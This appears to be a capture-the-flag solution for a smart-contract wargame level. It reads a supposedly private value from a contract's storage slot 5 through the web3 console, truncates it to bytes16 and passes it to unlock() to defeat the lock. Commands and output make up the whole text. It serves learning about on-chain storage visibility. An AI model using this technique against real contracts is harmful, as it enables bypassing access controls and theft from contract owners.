// using the console (CTRL + SHIFT + I), I used the following to interact with the instance of the contract:

// checking the address of the contract 
contract.address

// checking the abi of the contract 
contract.abi

// assigning the address of the instance to a variable 
var addr = '0x849cCf12fbF181fF698E4699Ed89E4A45E793B1C'
    
// getting the data at storage location '5', because that is where the 3rd array is located in the contract
await web3.eth.getStorageAt(addr, 5, console.log)
// this results in a 32 byte result 
// '0xea01fd1faa89a8fec54b6cd403fb89e8a670cce7b785d812baf4b6b4247b8fcc'

// checking that the contract is indeed unlocked 
await contract.locked()

// converted the 32 byte result to 16 bytes, as the input for the function is bytes16
await contract.unlock('0xea01fd1faa89a8fec54b6cd403fb89e8')

// waiting for the transaction to be confirmed

// checking that the contract is unlocked 
await contract.locked()

// unlocked.
